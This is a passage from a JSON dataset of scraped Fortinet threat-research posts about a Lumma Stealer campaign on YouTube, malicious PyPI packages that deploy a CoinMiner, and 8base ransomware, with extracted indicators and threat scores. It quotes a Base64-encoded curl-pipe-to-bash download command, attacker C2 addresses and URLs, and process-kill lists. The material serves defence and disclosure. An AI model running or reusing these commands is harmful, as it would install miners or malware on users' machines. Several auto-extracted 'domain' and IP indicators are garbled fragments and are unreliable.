      "scraped_at": "2025-07-20T13:50:53.039022",
      "indicators": {
        "ip_address": [],
        "domain": [
          "ain",
          "r",
          "md",
          "ocket",
          "etup",
          "owershell",
          "ddresses"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "377e8ca04aed57a10b350d9eb4a6e64818bb69b790f33db4be0fd22589c435ad",
          "d9568da21005794d80eb6572ccce47cc766ba5fe24b2b82cd4ff2cf05d8531a2",
          "03a1621af484ff8f5c1797b25426bab656b6731dba43e31fe58fc1f1963d8484",
          "dc5b74c1007bbe9acce3cddf30870766867b40e7d37264b7bdaf3b5f40747c10",
          "3dcff80475ebfb9a3aa93f3cebd8f008ea64d857a7c53719f1ca047dfd050e1c",
          "0e13bb49aba0878b919bc0980ce2e9e3cfa876387fcedf5af41235ab0f7a440a",
          "ab75ea75d1fe5bc51ecef274a95f7b835b09a0c7c95c4227366a3d64b5dee7c0",
          "24e07dd8c4a6fb92d842ebc168a40505bbd0421a16c13a06571910ca7a40a5a5",
          "ef0e1a8378d1dd9e3cfd0d59d1969b618e15ddb4bbfaf50057670842004346e8",
          "f1f6501a97b9145d8dd755d25a39c1803fe54995a39fd59b2914f591d56bdc68",
          "4fac457f8170e26643d0a4d8a0199e93d72872e1799e95f5c522a50754982079",
          "8fb72c3a6a5d96f91c3dc46541331ebf0a6cf326d2353ab6f2b1c119e9907670",
          "41ff3fedb78c672c6d0e5e849f81c8be10c0767558fcfdf6f529215556354d9e",
          "857bc70fb5968b9f5e257e41f4be9cdd8c7135314bf6200e2cf5b60186401e7a",
          "b2bf755c4e1336f5ab36bc679d4a86e4c0d4da7b33a26b9ec8c01e179027f66b",
          "2b617277fc551b7500867ee009a0f80cbe6d5ee729bdfbf9b4f9d52164811082",
          "c53d1387864ea3034bc4e19af492b3e67147d3fdc1d8b9752e24600d6919e3af",
          "c9e0b8c6c5140acae2b3bf003d9ae2a69abf04253b0bd932ec97c732a4b9bf97",
          "ec9e1342b0bddbd0ef65cd37a751b3a8c3c8170cdd8cce0f0fb6815b6be26a45",
          "f22110ea2376082651f5f0724875e6f9d083e2be0688dc06b59206c35fa50def",
          "94be6da31c5f896017af733a44b9ea00abbb35bce0a8dbcab776367234e4d818",
          "14cd40cce030bfca6a4c06fdadd353b5eaa092e7f73ba65308afedc04270c9b9",
          "da0c21c66fd0dc42b1bcb06c9bd0d7e48b1b866720229712df64410eebd62199",
          "8bdc674e3a41370a2d0a997b6ca673c6d646ed580400af242980a5ec374864a2",
          "6fe87ab0590229d11f2d174bcf13cfbaca6f6c9dc55af84527c96de16c12c799",
          "34e5bd67fbd9a7040dca9cae90e36013aaeda1940bb39e7fcd5d5fa9c85cadc8"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.5925925925925926
    }
  },
  {
    "id": "Fortinet_82205",
    "source": "Fortinet",
    "title": "Deceptive Cracked Software Spreads Lumma Variant on YouTube",
    "text": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The information collected can be used for future attacksSeverity Level:High FortiGuard Labs recently discovered a threat group using YouTube channels to distribute a Lumma Stealer variant. We found and reported on a similar attack method via YouTube inMarch 2023. These YouTube videos typically feature content related to cracked applications, presenting users with similar installation guides and incorporating malicious URLs often shortened using services like TinyURL and Cuttly. To circumvent straightforward web filter blacklists, the attackers exploit open-source platforms like GitHub and MediaFire instead of deploying their malicious servers. In this case, the shared links lead to the direct download of a new private . NET loader responsible for fetching the final malware, Lumma Stealer. Lumma Stealer targets sensitive information, including user credentials, system details, browser data, and extensions. It has been advertised on the dark web and a Telegram channel since 2022, with over a dozen observed command-and-control (C2) servers in the wild and multiple updates. Figure 1 shows Lumma Stealer's C2 server telemetry, illustrating a global presence with a peak observed in December. In this article, we will elaborate on each stage's behaviors that facilitated the stealer's distribution. The hacker initially breaches a YouTuber's account and uploads videos masquerading as sharing cracked software. Figure 3 shows the video descriptions in which a malicious URL is embedded, enticing users to download a ZIP file that harbors malicious content for the next stage of the attack. The videos were uploaded earlier this year, but the files on the file-sharing site receive regular updates (Figure 4), and the number of downloads keeps growing. This indicates that the ZIP file is always new and that this method effectively spreads malware. The ZIP file, “installer_Full_Version_V.1f2.zip,” contains an LNK file that calls PowerShell to download a . NET execution file via the GitHub repository “New” owned by John1323456 (Figure 6). The abbreviated URL, “hxxp://cutt[.]ly/lwD7B7lp,” connects to “hxxps://github[.]com/John1323456/New/raw/main/Installer-Install-2023_v0y.6.6[.]exe.” The other two repositories, “LNK” and “LNK-Ex,” also include NET loaders and spread InfoStealer as the final payload. The private . NET loader is obfuscated with SmartAssembly. It first gets the system’s environment value, shown in Figure 7. Once the number of the data is correct, it proceeds to load the PowerShell script. Otherwise, it exits the program. Figure 8 shows the construction of a dictionary that defines the following properties of the ProcessStartInfo object that the malicious code uses to execute discreetly and avoid raising suspicion from its victims: Next, the ProcessStartInfo object is employed to launch the PowerShell process, wherein the PowerShell script is directed to the process's standard input. Figure 9 illustrates a portion of the code and the newly generated process. Figure 10 shows the partial PowerShell code from the private . NET loader. The script encodes the server IP address in Base64 and encompasses four servers. It assesses the system date, choosing the appropriate IP to retrieve encrypted binary data. To obfuscate analysis, the script incorporates a substantial amount of extraneous code. Figure 11 shows captured traffic downloaded from the first server, 176[.]113[.]115[.]224:29983. After receiving the data, the script decrypts it using AES CBC, followed by GZip decompression to obtain the DLL file for the next stage. It then invokes the DLL file with a specific method and type via “[System. Reflection. Assembly]::Load(),” as shown in Figure 12. Figure 13 shows the targeted function “PerkyRiggal,” which is pivotal in inspecting the system and environment. It employs several PNG files in the Resources section to decipher the ultimate payload of Lumma Stealer. To avoid detection, the file encodes all its strings using the \"BygoLarchen\" method. Figure 14 demonstrates the function of decoding the target text with a predefined key string. It checks the following items to achieve Anti-VM and Anti-Debug: After completing all environment checks, the program decrypts the resource data and invokes the \"SuspendThread\" function. This function is employed to transition the thread into a \"suspended\" state, a crucial step in the process of payload injection (see Figure 15). Lumma stealer is a type of malware that can steal sensitive information from a user’s computer. It can target the system data, the browsers, crypto wallets, and browser extensions. It is written in C language and sold on underground forums. To elude detection and analysis, it employs diverse obfuscation techniques. The malware establishes communication with a command and control server, facilitating the exchange of instructions and transmitting pilfered data. Figure 16 shows the method to contact a command and control (C2) server. Once it gets the first server that can set up a connection, it then sends out a POST message with hardcoded User-Agent “Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36“ and parameter “act=life” to check-in. The corresponding code is shown in Figure 17. Next, it sends a POST request with the Lumma ID and “act=receive-message,” shown in Figure 18. Then, the compressed stolen data is uploaded to the C2 server with URI “/api.” Although the version is still “4.0,” Lumma Stealer has recently updated its exfiltration to leverage HTTPS to better evade detection. In this attack, the malicious actor targets YouTube channels to disseminate Lumma Stealer. The crafted installation ZIP file serves as an effective bait to deliver the payload, exploiting the user's intention to install the application and prompting them to click the installation file without hesitation. URLs from open-source websites throughout the scheme aim to diminish user awareness. The attackers further deploy a private . NET loader with environment checks, various anti-virtual machine (Anti-VM), and anti-debugging functions. Users must exercise caution regarding unclear application sources and ensure legitimate applications from reputable and secure origins are used. The malware described in this report are detected and blocked byFortiGuard Antivirusas: W32/Stealer. QLD!trMSIL/Agent. WML!trMSIL/Kryptik. BJF!trLNK/Agent. WML!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. The URLs are rated as “Malicious Websites” by theFortiGuard Web Filteringservice. We also suggest that organizations go through the freeFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. 176[.]113[.]115[.]224176[.]113[.]115[.]226176[.]113[.]115[.]227176[.]113[.]115[.]229176[.]113[.]115[.]232 Netovrema[.]pwopposesicknessopw[.]pwpolitefrightenpowoa[.]pwchincenterblandwka[.]pw 48cbeb1b1ca0a7b3a9f6ac56273fbaf85e78c534e26fb2bca1152ecd7542af54483672a00ea676236ea423c91d576542dc572be864a4162df031faf35897a53201a23f8f59455eb97f55086c21be934e6e5db07e64acb6e63c8d358b763dab4f7603c6dd9edca615d6dc3599970c203555b57e2cab208d87545188b57aa2c6b1 cracked,youtube,Cara Lin FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/lumma-variant-on-youtube",
      "scraped_at": "2025-07-20T13:51:01.813478",
      "indicators": {
        "ip_address": [
          "119.0.0.0"
        ],
        "domain": [
          "f2"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.17793594306049823
    }
  },
  {
    "id": "Fortinet_81255",
    "source": "Fortinet",
    "title": "Three New Malicious PyPI Packages Deploy CoinMiner on Linux Devices",
    "text": "FortiGuard Labs Threat Research Affected platforms:LinuxAffected parties:Linux users that have these malicious packages installedImpact:Latency in device performanceSeverity level:High On December 5th, 2023, FortiGuard's AI-driven OSS malware detection system identified three intriguing PyPI (Python Package Index) packages. These packages, upon initial use, deploy a CoinMiner executable on Linux devices. Leveraging our historical malware database, we noted that the indicators of compromise (IoCs) for these packages bear a resemblance to the \"culturestreak\" PyPI package discovered earlier this September. A comprehensive overview of the attack pattern of \"culturestreak\" was previously detailed in a Checkmarxblog post. In this analysis, we cover the attack phases of these three new packages, focusing on their similarities and developments compared to \"culturestreak.\" These three harmful packages are named modularseven-1.0, driftme-1.0, and catme-1.0. They all originate from the same author, known as \"sastra\", who created a PyPI account shortly before uploading the first of these malicious packages. These packages all exhibit a common attack methodology, so we will use driftme-1.0 as an example to illustrate the stages of the attack. Echoing the approach of the earlier \"culturestreak\" package, these packages conceal their payload, effectively reducing the detectability of their malicious code by hosting it on a remote URL. The payload is then incrementally released in various stages to execute its malicious activities. The malicious activity is triggered by the “import” statement in the __init__.py file: The processor.py module contains thefirst stageof the malicious payload: By calling the processing() function, it decodes the string Y3VybCBodHRwczovL3BhcGljdWxvLm5ldC91bm1pLnNoIHwgYmFzaA== into a shell command that fetches the content from the specified URL using curl. It then pipes that content directly to the Bash shell, which executes the following script: Looking into the “unmi.sh” script, we found that it contains thesecond stageof the malicious payload: Utilizing the “unmi.sh” script, the attacker downloads two critical items onto the user’s device: The first is “config.json,” a configuration file required for executing the program that will be installed. This file outlines the cryptocurrency mining setting. Specifically, it determines the mining algorithm, i.e., randomX, the device resource settings for mining operations, and the designated mining \"pools,\" along with the beneficiary’s wallet account. Notably, the attacker has chosen to disable the \"init-avx2\" feature, presumably to ensure compatibility with older devices. The second key component of the payload is the CoinMiner executable: Similar to the configuration file, this executable is also hosted at a remote address: hxxps://gitlab.com/ajo9082734/Mine/-/raw/main/X Once the executable is downloaded from the remote URL and marked as executable, the attacker employs the “nohup” command to execute it in the background. This ensures the process remains active beyond the terminal session. The most deceptive aspect is that the attacker ensures that all these modifications are appended to the ~/.bashrc file, ensuring the reactivation of this malicious activity whenever the user initiates a new Bash shell session. The coinMiner ELF file, retrieved during this process, is not new to the security community. It was initially uploaded to VirusTotal (VT) in 2021. Currently, a significant number of vendors on VT recognize the payload as malicious. The three packages discussed in this blog have IoCs similar to “culturestreak”: These three packages, when compared to \"culturestreak,\" showcase enhanced strategies in both concealing their presence and maintaining their malicious functions. A key enhancement is the introduction of an extra stage, where crucial commands for the malicious operations are stored in the “unmi.sh” file on a remote server. This tactic improves the odds of evading detection by security solutions by minimizing the code within the PyPI package. It also allows for more controlled disclosure of the malicious code by simply disabling the server hosting this “unmi.sh” script. Moreover, this malware inserts the malicious commands into the ~/.bashrc file. This addition ensures the malware's persistence and reactivation on the user's device, effectively extending the duration of its covert operation. This strategy aids in the prolonged, stealthy exploitation of the user's device for the attacker's benefit. A notable trend we observed from this particular set of packages is that malicious actors continuously refine their strategies to conceal and lengthen the exploitation process. An essential tactic discussed in this blog involves breaking down the entire malicious workflow into smaller stages and releasing them incrementally. For the security community, the ability to detect subtle malicious indicators becomes crucial. Furthermore, this serves as a reminder of the critical importance of thoroughly scrutinizing code and packages sourced from unverified or suspicious origins and staying well-informed about potential threats. FortiGuard AntiVirus detects the malicious files identified in this report as unmi.sh:Linux/Agent.4EFF!trmodularseven-1.0/modularseven/processor.py:Python/Agent.5337!trdriftme-1.0/driftme/processor.py:Python/Agent.5337!trcatme-1.0/catme/processor.py:Python/Agent.5337!trtmp/X:Riskware/CoinMiner The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. The FortiGuard Web Filtering Service detects and blocks the download URLs cited in this report as Malicious. TheFortiDevSecSCA scanner detects malicious packages, including those cited in this report, which may operate as dependencies in users' projects in test phases and prevents those dependencies from being introduced into users' products. If you believe these or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. 070128a5b4e1aecb61b59f3f8ef2602e63cd1e5357f1314080a7c8a4960b0bee modularseven-1.0/modularseven/processor.py 4b439d8cabc5e4ad593a26065e6d374efdddf41c8d91744b077a69812df170d2 driftme-1.0/driftme/processor.py 687fb012479e563be63e02718eb7be7ee81974193c952777ca94234c95b25115 catme-1.0/catme/processor.py 235b1ad3d21e7330d421c9a03b6b822fcdddacaa707bed9d67dabd43d4401fc6 df0211bf54174b5766366eecfb0a04c4a59346478e1507b6685fbaed6b2d2aca XLM:GA2DR34VWSXPIE2JFDUZFEIROMXRFYUYNB2XD5JWKPD2TWELUJQZ4WCW. WORKER hxxps[:]//papiculo[.]net/unmi[.]shhxxps[:]//papiculo[.]net/unmiconfig[.]jsonhxxps[:]//gitlab[.]com/ajo9082734/Mine/-/raw/main/X FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/malicious-pypi-packages-deploy-coinminer-on-linux-devices",
      "scraped_at": "2025-07-20T13:51:10.633186",
      "indicators": {
        "ip_address": [],
        "domain": [
          "rocessor",
          "nmi",
          "onfig",
          "itlab"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "4b439d8cabc5e4ad593a26065e6d374efdddf41c8d91744b077a69812df170d2",
          "235b1ad3d21e7330d421c9a03b6b822fcdddacaa707bed9d67dabd43d4401fc6",
          "070128a5b4e1aecb61b59f3f8ef2602e63cd1e5357f1314080a7c8a4960b0bee",
          "df0211bf54174b5766366eecfb0a04c4a59346478e1507b6685fbaed6b2d2aca",
          "687fb012479e563be63e02718eb7be7ee81974193c952777ca94234c95b25115"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.38106235565819857
    }
  },
  {
    "id": "Fortinet_97139",
    "source": "Fortinet",
    "title": "Ransomware Roundup - 8base",
    "text": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the 8base ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts and exfiltrates victims’ files and demands ransom for file decryptionSeverity level:High 8base is a financially motivated ransomware variant most likely based on the Phobos ransomware. Per our FortiRecon information, the 8base ransomware first appeared in May 2023. FortiGuard Labs has observed SmokeLoader variants delivering the 8base ransomware. Such SmokeLoader samples include bab3c87cac6db1700f0a0babaa31f5cd544961d1b9ec03fd8bcdeff837fc9755 and ea6adefdd2be00d0c7072a9abe188ba9b0c9a75fa57f13a654caeaaf4c3f5fbc. The 8base ransomware may also rely on other distribution methods. According to data collected through Fortinet'sFortiRecon service, the 8base ransomware has targeted multiple industry verticals (Figure 2). The ransomware most impacted business services, followed by the manufacturing and construction sectors. When victim organizations are ranked according to country (Figure 3), the United States leads by a wide margin. Once the ransomware is executed, it looks for files to encrypt. It skips files if the filename contains one of the following strings: info.hta (ransom note) info.txt (ransom note) bootfont.bin ntdetect.com It also avoids the following folders: The ransomware avoids encrypting files inside the Caches folder, most likely because doing so may lead to software problems. It also tries to kill the following processes before encrypting files: msftesql.exe sqlagent.exe sqlbrowser.exe sqlservr.exe sqlwriter.exe synctime.exe agntsvc.exe mydesktopqos.exe isqlplussvc.exe xfssvccon.exe mydesktopservice.exe ocautoupds.exe agntsvc.exe agntsvc.exe agntsvc.exe firefoxconfig.exe tbirdconfig.exe mysqld-nt.exe mysqld-opt.exe dbeng50.exe sqbcoreservice.exe infopath.exe msaccess.exe onenote.exe outlook.exe powerpnt.exe thebat64.exe thunderbird.exe winword.exe wordpad.exe Killing these processes ensures that any files open in them, such as MS Office files, will be closed so the ransomware can encrypt them. The 8base ransomware also checks for file size, with a threshold set at 1.5MB. The ransomware fully encrypts files smaller than 1.5MB. On the other hand, it partially encrypts files larger than 1.5MB, most likely to increase the encryption speed. The encryption speed is often a subject of competition among ransomware developers because they want to encrypt as many files as possible before the victim becomes aware of the infection. To elaborate a bit, the ransomware injects blocks comprised of 0x40000 null bytes into various parts of the final output/encrypted file, starting at the beginning of the file. It also encrypts the last 0xC0000 bytes (with additional encrypted metadata) and may leave other parts of the file unencrypted. The ransomware then uses AES to encrypt any target files discovered and adds a file extension that includes the attacker’s contact email address “.id[unique ID assigned to the victim].[removed@rexsdata.pro].8base”. In the middle of November 2023, we came across a different version of the 8base ransomware (SHA2: 45de59851d68929632346d6f894dc8c1b6a5c4197db83c2e33c60631efc0b39f). This variant is written in C instead of the . NET used in older variants. This recent 8base ransomware variant excludes the same files and folders from file encryption, but after encrypting files, it displays a significantly longer ransom note than the one used in the . NET variants. The ransom note includes a contact email address and a TOR data leak site address not included in previous ransom notes. It also adds a new file extension to the files it encrypts, “.id[unique ID assigned to the victim].[recovery8files@(removed).org].8base”. The 8base ransomware group owns a TOR site where victims can contact the threat actor. The stolen information was released through various file storage/sharing services such as Gofile, Pixeldrain, files.dp.ua, AnonFiles, Anonym File, and Mega. The 8base ransomware TOR site includes a victim list, contact form, FAQ, and terms of service. Fortinet customers are already protected from this malware variant through our AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects the 8base ransomware samples with the following AV signatures: TheFortiGuard AntiVirus serviceis supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. 30e90f33067608e8e7f4d57fd6903adb5eccb91bf426c56569c16bf86f0d8971 45de59851d68929632346d6f894dc8c1b6a5c4197db83c2e33c60631efc0b39f b3725e7f3a53ea398fd0136e63c9c11d8c1addc778eece2ce1ac2ca2fc9cd238 c83894f6f01a0d4a492c2e05966816e27dac6b9093f83b499b6a5b2f28b53cec 4e4c154f0500990e897ca9650eafd3c6255ba4df3b4bc620c6ba27b718278392 159fa561bf9069418c5b2a33525ee12b16385f96680890a285d401b9f6781643 7e18ff461e3fc159c9b6634c9250600ea4c62da604885697c95d9bac794109b8 482754d66d01aa3579f007c2b3c3d0591865eb60ba60b9c28c66fe6f4ac53c52 49699985414185b85cdf0a0292dfd1fb0e7b0b4925daa165351efed6e348335a 2cfd30a7982b90be60f83fe5f4132999ac50d0d63d9681d8d50c3c8271faa34b 8f60d17bbaefd66fe94d34ea3262a1e94b0f8f0702c437d19d3e292c72f1cedc 274c6ea98df4de5fc99661b0af876c3556c8a9125697efa3cbdc6fa81b80395d 427ac2bb816309c11b12c895787c862017d5725ed7de137b5eb10c03e89c0b8c 518544e56e8ccee401ffa1b0a01a10ce23e49ec21ec441c6c7c3951b01c1b19c 3d805293a70df3a5e1e392ee05ed7b88eda054ee97072eac5590baecfc44cb74 88f6a6455f92255a189526e36aeb581c95c28dc5e26357e7667f871444a336ba fa620f37539b2c7e53d4c06de1b680d0eab5c3a5280b89d1700e014bfd320519 b3e80316dc1e01af60bcea7218ab5ebfe81432643d29ab46b22e3b11658606d5 03666df8dd1cd6f9e05e28a0660223d514351e05a8c61179f59e9e2c5e10d471 4fd3f6a16bccb7c9d4631241b6f8ebe58515fa2c593e4c938939492615869432 8c46f85644793051b8966d2edeeccdb8416aa04289dc0803d8da90fe6c98014c abc4e3744b5a6b6ca367b81dabc9ff13d509d0bb5b4be6daa7d5419c57e5ea4b 2a270618cf65fcfb6476269b7c7bdbae84552d15a3da3e8907425e20ace4548a 01b2ec8085dace807c190f3f26d5e5ce45be0c0ecbd9c944303a36f323272226 d7cb8a2d60e1818d0638a4c38cd6fae475dc83ab7b2bde9827ecc4e4a7ce6ed7 0c0bdd6f7e780b5bde33342e142af12d0d3b2ae40e6d5ab48a4fde3e32751a75 f5d99d4548470b4699b215453e9be29e48aa20616d45f704c335bd3bbe3e0a4f f595f91a9966808cc85d11981e66e98043af9aeaaaa3893ef058b9a79c474f17 aedbddbf7494baaaf759a720d9cd17540d3c171b9cc52a02e0ef9a592bd9cd63 698b2a9cf9ce16f1cb5cff4576e902888cb14db7414b8e6ac4eb728f8c87d209 9f67b6057e5b5dc4b2ec3b370ca3062e0bed91a934b227911af2a3de17164ee5 2673be0eb2cc75805d67cc5876b98cbbe330c73a223be23fb3b41eb447ccd1c9 3a6cfcbf9ef082d94b7a8a0050f42761e115aa3b6ff26edb6c7daf4437fe9917 0867a5d4559cb7084765944e5ab71c67629e90a5fa15e66b7b3d47059c76cb78 33c861023479ddcaea82f2daee9d0394f304d0c33ba210f4c3c53a93cf9a474c 71bd706cc0ace3774449282a9c1de5403f8f43dad118b9fbf4fc45cf4894f8e9 bcdf23bb2e1635cb6639895094f7115af7bc9d07f276507af291cd9b7124e135 a1ee84c3183521e345b17502b38621201ff6edb86db81debec25d58dec5ad96c 667dfdc8b8527599735d93ba94d5e9a30442db7c9e780f103fea07172ee8c740 6e591d4815d6e7ec082696f002c843c6d9155e944a99cdd7dab3db372db6a877 d26de80e8b561adcf33ab3f2fe29f22c6eaddfbe247dcf9028463214e0f87e90 54b3641fc695438be989a08a9dca9f2a5d1ed9d538cb83cb597a17480d580c39 eb24adb38f36113fe71f942596c355afd59a2e83a0663daf32ae9bb30059732c db85c5455b1adee337cf5b6728a9a4776e3645e50d0bf7ff410e34bb710cc42a c68d9dcd8a3038bfe7c6c008149c8792b6033e6249286e4692e16dcb2bd90d41 05c29b528fccf8c2793663a6725c9bf680944ffa6a26129d7aaafd1980bd034c a31a45f1c686c1ae2ff1733e7e7636a17010b85091b17bdf68c27543866dfca5 2288a0c896757647538a7dab5e0c980b70b173ed36c9e6206f6701dfd4112cfb 9215550ce3b164972413a329ab697012e909d543e8ac05d9901095016dd3fc6c 91abe280381d0faf55b521f51d16d8aa022f0cc14b1310334d4fffc3474459d4 d0604a3864899ac9bf0a07e47330b62a3e76b61335d6dac2e9b5a796b9fcc164 d560b84be808a9a324b995a05686237d645248369ce04069350d5b5d979d8365 fd59543a425d2159dfadba8efd4d40178b609ef123a8bc5cf00fe3afef95623d 25d4ec23c3618c7bdbef717c9ded9f7da560b3eb13d8d20f958fe3fbe5a1e37b 97a4d094f86b757b3fb0e189f2843a7af8d0ec43f9805214e89992528e83b5d7 f709d1f84e4f0a845ebb4a9fb1500aa2a9fd600e97cbea32ffc3e49c1084f467 a8d2d0ceaaf6685644b228a767ea6299ea2968f7cae79dd36abf4225b8593fdd 8879a7a950a3916f5438685f994ee829a20e4c60021db73060cd078e4a72b5a7 c0539fd02ca0184925a932a9e926c681dc9c81b5de4624250f2dd885ca5c4763 fa7ed15708d988e7f69b5628db9481816052efea29e93f1bd274a1d76006aee6 790b64a5860a5069fedcb660efdffce2b5ab2195086100a6079697b662f0c198 454f9058a9fd9c266782389850d6142a0d04ce9d8042bc069ccd8d90d60be6d5 32d1458fb5c0c08156568a658f30143786336a73dea1d76bef9becf4a55c0964 3cb4c0f6430f5216818c3438a18c96e7dcf5080129c9eea3f50735811c3e85eb 9d163fbffc9692a3143362c51d35d5ab52d1f209d9d5e053196c79a30e6f7acf 681f180735ec833997bea4eb26c58f9c2e39980cd0a351e0b5cd99c502b33ae8 917f2b461c860f2ee8aed1147094b9273931bb9ee8040d609a485ec150dc3ec0 9f40b69060a52731107baec84a0c0f8a1bfc1a62e8471b9cd69509aade9cb7f1 d4cb20dba15d88c38c35be69fe04538b4f9bb0a12edb51ff23c0171b584edf08 f9805be70bc5c750e01a82742a66e6ffa9ade0ba2f80a97cadbb8fcaeb60dda7 4b891c6c3520d1d81e083f72d7ee9c92870ac6633f1f8419b2f50b4f90681ed6 78732997a6c9d975b97da85fc511533d44083a9f9da60dae8393274a59b7bfce e98c033e303e64af465b7d41d779a3780708c97822a6ebb7cf6ff3db64bc3416 2a50a42d3c44e6e3890a53228cb84f6fdb17e38b31422c68b8634a06d36cc324 104032d8993555a84679746069ad1f8c1365c4a27eaeec732fda76aa62da005a 96a3909ca8917c14a7bd36839dd5abf5c9df9f69b314158e0110365113acf4bb 356799503f195db260e08a81d42a431b4ebd47cef94eddc96f24a0fd3e49d716 15c9373bc7a1cc990d6caa0f3262f6c4adeff93337f642f752b64947ae50cec9 3ec359f6ab125099db4a4f7b6ad6b17ab1411a338be932ea45aea13aad7788c8 45dcbfbb139c81af47b6953482c2d146f5192054c29a2343019e6f1d30912ff4 6cb41c5e8379cc137f64c91f5aaaf88da43b3d13791f12884bedd5a81a83b8d2 505bc570566804139166c0f12ea773d1c459682cc13cfca823b2ddfbd48cd2e2 00e6061a54e469f6c957eda96a0267efded5f8a6a8d4006ea74ded74df5eb703 32b815ce14e6606e53b1ddaf39900c91f126e1d9ce9c5cab2fe825d6b2fa74d9 f909efbae3c83ae64dcd8f57e18be891df6386ca89f3a2f4c40d12ebc1913ef4 872ee36c064f5d9e7df3e5495c7de6aba4b26856556ba2ac124cdbb02693aa02 52661e5c4f8503541a5f361cfa8e4518f852907365e23fdfcc8472fea67df12b 408d62cbf4789d9533230eff49b8b45c11b01fd8c8d6d65ec339725d7521a48c 8113218903975b81b22049796f201e06638595d2f6fadd82da06817bfbce85d7 281481eb8f1579206e55232754f47587a61bbe1460fc1f3b06157f31d214a290 c447b9a04d36e1a1e8560fc380dec019ec3b63506d07d0116e1ec2c28a9b1c30 89c65668def919cdf677df2774c5646540fee498031f7ecd5c7a6be7b62e9953 bab3c87cac6db1700f0a0babaa31f5cd544961d1b9ec03fd8bcdeff837fc9755 ea6adefdd2be00d0c7072a9abe188ba9b0c9a75fa57f13a654caeaaf4c3f5fbc Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. FortiReconis a SaaS based Digital Risk Prevention Service backed by cybersecurity experts to provide unrivaled threat intelligence on the latest threat actor activity across the dark web, providing a rich understanding of threat actors’ motivations and TTPs. The service can detect evidence of attacks in progress allowing customers to rapidly respond to and shut down active threats. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP)is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation. Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-8base",
      "scraped_at": "2025-07-20T13:51:18.824075",
      "indicators": {
        "ip_address": [],
        "domain": [
          "nfo",
          "hebat64",
          "qlwriter",
          "ootfont",
          "utlook",
          "qbcoreservice",
          "gntsvc",
          "inword",
